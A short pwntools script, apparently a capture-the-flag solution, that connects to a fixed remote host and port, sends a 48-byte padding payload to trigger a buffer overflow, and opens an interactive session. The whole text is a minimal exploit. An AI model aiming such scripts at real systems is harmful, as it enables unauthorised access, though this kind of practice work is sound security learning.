from pwn import *

io = remote("167.99.86.8", 30042)
io.sendline(b'A'*48)
io.interactive()
